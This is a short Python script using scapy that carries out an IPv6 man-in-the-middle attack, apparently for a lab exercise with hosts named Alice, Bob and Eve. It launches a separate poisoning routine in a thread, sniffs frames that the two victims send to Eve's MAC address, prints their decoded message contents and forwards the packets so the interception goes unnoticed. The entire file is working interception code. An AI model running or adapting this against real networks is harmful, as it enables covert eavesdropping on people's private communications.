from scapy.all import *
from network_details import *
from threading import Thread
import poisoner

def printConversation(pkt):
    if pkt[Ether].src == ALICE_MAC:
        pkt[Ether].dst = BOB_MAC
    else:
        pkt[Ether].dst = ALICE_MAC
    
    if Raw in pkt:
        content = pkt[Raw].load.decode()
        if pkt[Ether].src == ALICE_MAC:
            print("Alice: " + content)
        else:
            print("Bob: " + content)
    
    sendp(pkt, verbose=0)

def AliceAndBobConnect(pkt):
    return Ether in pkt and IPv6 in pkt and\
    ((pkt[Ether].src == ALICE_MAC and\
    pkt[Ether].dst == EVE_MAC and\
    pkt[IPv6].src == ALICE_IPv6 and\
    pkt[IPv6].dst == BOB_IPv6)\
    or\
    (pkt[Ether].src == BOB_MAC and\
    pkt[Ether].dst == EVE_MAC and\
    pkt[IPv6].src == BOB_IPv6 and\
    pkt[IPv6].dst == ALICE_IPv6))


def main():
    # poison
    Thread(target=poisoner.poison, args=()).start()    
    
    # and start listening to Alice & Bob conversation
    sniff(lfilter=AliceAndBobConnect, prn=printConversation)
    
    
if __name__ == "__main__":
    main()